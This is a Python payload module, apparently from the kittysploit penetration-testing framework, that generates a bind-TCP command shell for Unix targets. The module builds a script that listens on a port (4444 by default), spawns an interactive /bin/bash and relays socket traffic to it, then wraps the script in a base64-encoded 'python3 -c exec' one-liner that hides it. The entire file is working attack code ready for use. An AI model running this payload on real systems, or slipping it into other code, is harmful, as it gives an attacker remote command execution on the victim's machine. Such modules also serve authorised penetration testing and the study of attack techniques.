from kittysploit import *
import base64


class Module(Payload):

    CLIENT_LANGUAGE = "python"

    __info__ = {
        'name': 'Unix Command Shell, Bind TCP (via Python)',
        'description': 'Listen on the target and expose an interactive command shell via Python',
        'category': PayloadCategory.SINGLE,
        'arch': Arch.PYTHON,
        'platform': Platform.UNIX,
        'listener': 'listeners/multi/bind_tcp',
        'handler': Handler.BIND,
        'session_type': SessionType.SHELL
    }

    rhost = OptString('0.0.0.0', 'Address to bind on the target', True)
    rport = OptPort(4444, 'Port to bind on the target', True)
    shell_binary = OptString('/bin/bash', 'The system shell in use', True, True)
    python_binary = OptString('python3', 'Python binary version', True)
    encoder = OptString('', 'Encoder', False, True)
    reuse_addr = OptBool(True, 'Enable SO_REUSEADDR before bind', False, True)

    def _build_script(self, host: str, port: int, shell: str) -> str:
        reuse = "srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\n" if self.reuse_addr else ""
        return (
            "import socket,subprocess,threading,os\n"
            "srv=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
            f"{reuse}"
            f"srv.bind(('{host}',{port}))\n"
            "srv.listen(1)\n"
            "c,a=srv.accept()\n"
            f"p=subprocess.Popen(['{shell}','-i'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
            "def r():\n"
            " while True:\n"
            "  try: d=c.recv(4096)\n"
            "  except: break\n"
            "  if not d: break\n"
            "  p.stdin.write(d); p.stdin.flush()\n"
            "def w():\n"
            " buf=b''\n"
            " while True:\n"
            "  try: ch=p.stdout.read(1)\n"
            "  except: break\n"
            "  if not ch: break\n"
            "  buf+=ch\n"
            "  if ch==b'\\n' or len(buf)>=64: c.sendall(buf); buf=b''\n"
            " if buf: c.sendall(buf)\n"
            "t1,t2=threading.Thread(target=r),threading.Thread(target=w)\n"
            "t1.daemon=t2.daemon=True\n"
            "t1.start();t2.start()\n"
            "t1.join();t2.join()\n"
            "c.close();srv.close()\n"
        )

    def get_python_script(self):
        host = str(self.rhost)
        port = int(self.rport)
        shell = str(self.shell_binary).replace("'", "'\"'\"'")
        return self._build_script(host, port, shell)

    def generate(self):
        script = self.get_python_script()
        encoded = base64.b64encode(script.encode('utf-8')).decode('ascii')
        return f'{self.python_binary} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
